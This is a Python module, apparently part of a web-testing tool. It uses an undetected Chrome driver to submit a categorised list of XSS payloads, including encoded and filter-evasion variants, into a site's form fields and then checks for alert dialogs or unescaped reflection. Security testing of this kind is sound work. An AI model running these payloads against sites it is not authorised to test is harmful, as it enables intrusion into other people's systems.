#!/usr/bin/env python3
import logging
import time
import random
import re
import json
import os
from typing import Dict, Any, List, Optional, Tuple

from selenium.webdriver.common.by import By
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
from selenium.common.exceptions import (
    TimeoutException, 
    NoSuchElementException,
    ElementNotInteractableException,
    StaleElementReferenceException,
    WebDriverException
)
import undetected_chromedriver as uc
import utils

# XSS Payloads organized by category
XSS_PAYLOADS = {
    "basic": [
        "<script>alert(1)</script>",
        "<img src=x onerror=alert(1)>",
        "<div onmouseover='alert(1)'>hover me</div>",
        "javascript:alert(1)"
    ],
    "attribute": [
        "\" onmouseover=\"alert(1)\"",
        "' onclick='alert(1)'",
        "\"><script>alert(1)</script>",
        "';alert(1);//"
    ],
    "encoded": [
        "<script>eval(String.fromCharCode(97,108,101,114,116,40,49,41))</script>",
        "<img src=\"x\" onerror=\"&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;\">",
        "<svg onload=alert&#40;1&#41;>",
        "%3Cscript%3Ealert(1)%3C/script%3E"
    ],
    "dom": [
        "#<script>alert(1)</script>",
        "?q=<script>alert(1)</script>",
        "javascript:void(0/**/);alert(1)"
    ],
    "evasion": [
        "<scr<script>ipt>alert(1)</scr</script>ipt>",
        "<script>setTimeout('ale'+'rt(1)',0)</script>",
        "<img src=x:alert(alt) onerror=eval(src) alt=1>",
        "<script>/* */alert(1)/* */</script>"
    ]
}

# Patterns to detect XSS reflection in responses
XSS_REFLECTION_PATTERNS = [
    r"<script>alert\(1\)</script>",
    r"<img src=x onerror=alert\(1\)>",
    r"onmouseover=['\"]alert\(1\)['\"]",
    r"onclick=['\"]alert\(1\)['\"]",
    r"alert\(1\)",
    r"javascript:alert"
]

def detect_xss_reflection(html_content: str, payload: str) -> bool:
    """
    Check if a given XSS payload is reflected in the HTML response.
    
    Args:
        html_content: HTML content to check
        payload: XSS payload that was submitted
        
    Returns:
        True if payload is reflected without sanitization, False otherwise
    """
    # Check for exact payload reflection
    if payload in html_content:
        # Check if it's sanitized (e.g., HTML encoded)
        sanitized_payload = payload.replace("<", "&lt;").replace(">", "&gt;")
        if sanitized_payload in html_content and payload not in html_content:
            return False
        return True
    
    # Check for specific reflection patterns
    for pattern in XSS_REFLECTION_PATTERNS:
        if re.search(pattern, html_content):
            return True
            
    return False

def test_form_field_xss(driver: uc.Chrome, field_info: Dict[str, Any], 
                        payload: str, logger: logging.Logger) -> Tuple[bool, str]:
    """
    Test a specific form field with an XSS payload.
    
    Args:
        driver: Selenium WebDriver instance
        field_info: Field configuration
        payload: XSS payload to test
        logger: Logger instance
        
    Returns:
        Tuple of (is_vulnerable, details)
    """
    field_id = field_info.get('id')
    field_name = field_info.get('name')
    field_type = field_info.get('type', 'text')
    selector = field_info.get('selector')

    # Skip fields that don't support text input
    if field_type in ['submit', 'button', 'file', 'checkbox', 'radio']:
        return False, f"Skipped field type '{field_type}'"
    
    try:
        # Find field using multiple strategies
        field_element = utils.find_form_field(driver, field_id, field_name, selector)
        
        if not field_element:
            return False, f"Field not found: id={field_id}, name={field_name}, selector={selector}"
        
        # Clear existing value
        field_element.clear()
        
        # Input XSS payload
        field_element.send_keys(payload)
        
        # Log the action
        logger.debug(f"Inserted payload '{payload}' into field: id={field_id}, name={field_name}")
        
        return False, "Payload inserted, will check reflection after submission"
        
    except Exception as e:
        logger.error(f"Error testing field with XSS payload: {str(e)}")
        return False, f"Error: {str(e)}"

def setup_browser() -> uc.Chrome:
    """
    Set up and configure the undetected Chrome browser.
    
    Returns:
        Configured Chrome WebDriver instance
    """
    # Create a simple logger for this function
    logger = logging.getLogger(__name__)
    
    # Create minimal config
    config = {
        "name": "xss_test_browser",
    }
    
    # Use the centralized setup_driver function from utils
    return utils.setup_driver(config, logger)

def run_xss_mode(context: Dict[str, Any]) -> Dict[str, Any]:
    """
    Main function to run the XSS testing mode.
    
    Args:
        context: Application context containing configuration and other data
    
    Returns:
        Dictionary with test results
    """
    config = context["config"]
    logger = context["logger"]
    
    # Get the target URL
    url = config.get("url")
    if not url:
        logger.error("No URL defined in configuration")
        return {"error": "No URL defined", "xss_vulnerabilities": []}
    
    logger.info(f"Starting XSS testing on URL: {url}")
    logger.info(f"Using configuration: {json.dumps(config, indent=2)}")
    
    # Get XSS testing settings
    xss_settings = config.get("xss_settings", {})
    test_all_fields = xss_settings.get("test_all_fields", True)
    max_attempts_per_field = xss_settings.get("max_attempts_per_field", 0)  # 0 means test all payloads
    payload_categories = xss_settings.get("payload_categories", list(XSS_PAYLOADS.keys()))
    
    # Set up the browser
    driver = setup_browser()
    
    # Track results
    total_tests = 0
    xss_vulnerabilities = []
    
    try:
        # For each text field, test with XSS payloads
        fields = config.get("fields", {})
        text_fields = {name: field for name, field in fields.items() 
                      if name != "submit_button" and field.get("type") != "checkbox"}
        
        for field_name, field_config in text_fields.items():
            selector = field_config.get("selector")
            selector_type = utils.get_selector_type(field_config)
            wait_time = utils.get_element_wait_time(context)
            
            if not selector:
                logger.warning(f"No selector defined for field '{field_name}', skipping")
                continue
            
            logger.info(f"Testing field '{field_name}' with selector: {selector}")
            
            # Combine payloads from selected categories
            payloads = []
            for category in payload_categories:
                if category in XSS_PAYLOADS:
                    payloads.extend(XSS_PAYLOADS[category])
            
            # Limit number of payloads if max_attempts is set
            if max_attempts_per_field > 0 and max_attempts_per_field < len(payloads):
                payloads = random.sample(payloads, max_attempts_per_field)
            
            # Test each payload
            for payload in payloads:
                total_tests += 1
                logger.info(f"Testing payload #{total_tests}: {payload}")
                
                # Load the page
                driver.get(url)
                time.sleep(2)  # Wait for page to load
                
                # Find and fill the field
                by_type = By.CSS_SELECTOR if selector_type == "css" else By.XPATH
                
                try:
                    wait = WebDriverWait(driver, wait_time)
                    element = wait.until(EC.presence_of_element_located((by_type, selector)))
                    element.clear()
                    element.send_keys(payload)
                    
                    # Fill other required fields with benign data
                    for other_name, other_field in fields.items():
                        if other_name != field_name and other_name != "submit_button" and other_field.get("required", False):
                            other_selector = other_field.get("selector")
                            other_type = utils.get_selector_type(other_field)
                            
                            if not other_selector:
                                continue
                                
                            by_other_type = By.CSS_SELECTOR if other_type == "css" else By.XPATH
                            try:
                                other_element = WebDriverWait(driver, wait_time).until(
                                    EC.presence_of_element_located((by_other_type, other_selector))
                                )
                                other_element.clear()
                                other_element.send_keys("test data")
                            except (TimeoutException, NoSuchElementException):
                                logger.warning(f"Could not find element for field '{other_name}'")
                    
                    # Submit the form
                    submit_button = fields.get("submit_button", {})
                    submit_selector = submit_button.get("selector")
                    submit_type = utils.get_selector_type(submit_button)
                    
                    if submit_selector:
                        by_submit_type = By.CSS_SELECTOR if submit_type == "css" else By.XPATH
                        try:
                            submit_btn = WebDriverWait(driver, wait_time).until(
                                EC.element_to_be_clickable((by_submit_type, submit_selector))
                            )
                            submit_btn.click()
                            time.sleep(2)  # Wait for form submission
                        except (TimeoutException, NoSuchElementException):
                            logger.warning("Could not find submit button")
                    
                    # Check for signs of successful XSS
                    # 1. Look for alert dialog
                    try:
                        alert = driver.switch_to.alert
                        alert_text = alert.text
                        alert.accept()
                        
                        logger.critical(f"POTENTIAL XSS VULNERABILITY DETECTED! Alert dialog appeared with text: {alert_text}")
                        xss_vulnerabilities.append({
                            'field': field_name,
                            'payload': payload,
                            'type': 'alert',
                            'details': f"Alert dialog with text: {alert_text}",
                            'url': url
                        })
                        
                    except Exception:
                        # No alert found, continue with other checks
                        pass
                    
                    # 2. Check if the payload appears unescaped in the page
                    page_source = driver.page_source
                    
                    # Create regex pattern for detecting the payload in the source
                    # This is a simple version and may need refinement
                    escaped_payload = re.escape(payload)
                    pattern = escaped_payload.replace(r'\<', '<').replace(r'\>', '>')
                    
                    if re.search(pattern, page_source):
                        logger.critical(f"POTENTIAL XSS VULNERABILITY DETECTED! Unescaped payload found in page source: {payload}")
                        xss_vulnerabilities.append({
                            'field': field_name,
                            'payload': payload,
                            'type': 'unescaped',
                            'details': "Payload found unescaped in page source",
                            'url': url
                        })
                    
                except (TimeoutException, NoSuchElementException) as e:
                    logger.warning(f"Could not find element for field '{field_name}': {e}")
                except (ElementNotInteractableException, StaleElementReferenceException) as e:
                    logger.warning(f"Could not interact with element for field '{field_name}': {e}")
                except Exception as e:
                    logger.error(f"Error testing payload on field '{field_name}': {e}")
                
                # Brief pause between tests
                time.sleep(1)
                
            # Stop testing more fields if test_all_fields is False and we found something
            if not test_all_fields and xss_vulnerabilities:
                logger.info("Vulnerability found and test_all_fields is False. Stopping further tests.")
                break
    
    except Exception as e:
        logger.error(f"Error during XSS testing: {e}")
    finally:
        # Close the browser
        driver.quit()
        logger.info("Browser closed")
    
    # Generate report
    logger.info(f"XSS testing completed: {total_tests} tests executed")
    
    results = {
        "total_tests": total_tests,
        "xss_vulnerabilities": xss_vulnerabilities
    }
    
    if xss_vulnerabilities:
        logger.critical(f"FOUND {len(xss_vulnerabilities)} POTENTIAL XSS VULNERABILITIES!")
        for i, vuln in enumerate(xss_vulnerabilities, 1):
            logger.critical(f"Vulnerability #{i}:")
            logger.critical(f"  Field: {vuln['field']}")
            logger.critical(f"  Payload: {vuln['payload']}")
            logger.critical(f"  Type: {vuln['type']}")
            logger.critical(f"  Details: {vuln['details']}")
            logger.critical(f"  URL: {vuln['url']}")
    else:
        logger.info("No obvious XSS vulnerabilities detected")
    
    return results 